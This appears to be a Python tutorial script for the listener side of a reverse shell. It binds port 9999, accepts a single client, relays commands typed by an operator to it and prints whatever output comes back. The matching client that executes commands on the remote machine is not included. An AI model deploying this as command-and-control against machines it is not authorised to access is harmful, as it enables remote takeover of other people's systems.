import socket
import sys

# Create socket
def socket_create():
    try:
        global port
        global host
        global s
        host=''
        port=9999
        s=socket.socket()   # Conversation between the client and server
    except socket.error as msg:
        print("Socket creation error " + str(msg))

# Binding a socket to a port and wait for connection from client
def socket_bind():
    try:
        global port
        global host
        global s
        print("Binding to Port : " + str(port))
        s.bind((host, port))    # Bind socket to port
        s.listen(5)             # Allows 5 bad connections from the server before refusing new connections
    except socket.error as msg:
        print("Socket binding error :" + str(msg) + "Retrying...")
        socket_bind()

# Connection to a client
def socket_accept():
    conn, address= s.accept()
    print("Connection has been established " + "IP " + address[0] + " Port " + str(address[1]))
    send_commands(conn)
    conn.close()

# Send commands
def send_commands(conn):
    while True:
        cmd=input()
        if cmd == 'quit':
            conn.close()
            s.close()   # Closes the connection
            sys.exit()
        if len(str.encode(cmd)) > 0:    # Data transmission is in bytes so it is encoded to string
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")      # end is used so that o/p resembles a cmd

def main():
    socket_create()
    socket_bind()
    socket_accept()

main()



